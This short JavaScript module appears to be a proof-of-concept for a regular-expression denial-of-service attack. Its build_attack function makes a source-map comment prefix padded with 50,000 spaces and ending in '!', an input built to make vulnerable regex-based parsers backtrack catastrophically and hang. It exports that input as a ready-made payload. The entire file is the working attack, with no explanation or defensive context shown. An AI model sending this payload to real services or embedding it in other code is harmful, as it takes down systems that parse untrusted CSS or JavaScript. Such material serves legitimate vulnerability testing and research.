function build_attack(n) {
  var ret = "/*# sourceMappingURL=";
  for (var i = 0; i < n; i++) {
    ret += " ";
  }
  return ret + "!";
}

function getPayload() {
    return build_attack(50000);
}

module.exports = { getPayload };